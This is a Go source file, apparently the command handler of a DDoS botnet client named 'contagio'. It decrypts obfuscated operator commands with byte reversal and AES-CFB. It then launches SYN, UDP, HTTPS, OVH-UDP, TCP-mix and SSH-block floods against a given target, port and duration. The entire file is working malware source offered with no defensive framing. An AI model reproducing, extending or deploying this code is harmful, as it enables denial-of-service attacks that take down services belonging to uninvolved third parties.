package main

import (
	"bytes"
	"contagio/bot/methods"
	"contagio/bot/utils"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"strconv"
	"strings"
	"time"
)

var commands = []string{
	"!syn",
	"!udpmix",
	"!https",
	"!ovhudp",
	"!sshblock",
	"!tcpmix",
}

func CommandHandler(_command string) {
	command := strings.ReplaceAll(string(_command), "\n", "")

	checkcmd := func() bool {
		for _, i := range commands {
			if strings.HasPrefix((command), i) {
				return true
			}
		}
		return false
	}()

	if !checkcmd {
		return
	}

	target, port, duration := parseArgs(command)

	if strings.HasPrefix(command, "!https") {

		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
			defer cancel()

			methods.HttpsMethod(ctx, target, port)

		}()

	}

	if strings.HasPrefix(command, "!udpmix") {

		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
			defer cancel()

			methods.UdpMethod(ctx, target, port)

		}()

	}

	if strings.HasPrefix(command, "!ovhudp") {

		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
			defer cancel()

			methods.OvhUdpMethod(ctx, target, port)

		}()

	}

	if strings.HasPrefix(command, "!syn") {

		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
			defer cancel()

			methods.SynMethod(ctx, target, port)

		}()
	}

	if strings.HasPrefix(command, "!tcpmix") {

		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
			defer cancel()

			methods.TcpMixMethod(ctx, target, port)

		}()
	}

	if strings.HasPrefix(command, "!sshblock") {

		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
			defer cancel()

			methods.SshBlockMethod(ctx, target, port)

		}()
	}

}

func parseArgs(_args string) (target string, port string, duration int) {
	defer methods.Catch()

	args := strings.Split(_args, " ")

	fmt.Println(args)
	if len(args) < 4 {
		return "", "", 0
	}

	duration, _ = strconv.Atoi(string(utils.FormatCommand(args[3])))

	return args[1], args[2], duration
}

func Decrypt(command []byte) string {

	defer methods.Catch()

	command = bytes.TrimPrefix(command, []byte{255, 255, 10, 29, 49, 19, 10, 12, 44, 202})

	for i := range command {
		command[i] = reverseBytes(command[i])
	}

	temp := string(reverseArrayBytes(command))

	key := string(temp[:16]) + string(temp[len(temp)-16:])

	res := dec([]byte(key), []byte(temp[16:len(temp)-16]))

	return res

}

func dec(key, cipherText []byte) string {
	defer methods.Catch()

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	if len(cipherText) < aes.BlockSize {
		fmt.Println(err)
		return ""
	}

	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(cipherText, cipherText)

	return string(cipherText)
}

func reverseBytes(bytes byte) (res byte) {
	defer methods.Catch()

	for i := 0; i < 8; i++ {
		res <<= 1
		res |= bytes & 1
		bytes >>= 1
	}
	return res
}

func reverseArrayBytes(input []byte) []byte {
	var res = make([]byte, 0)

	for i := range input {
		x := input[len(input)-1-i]
		res = append(res, x)
	}

	return res
}
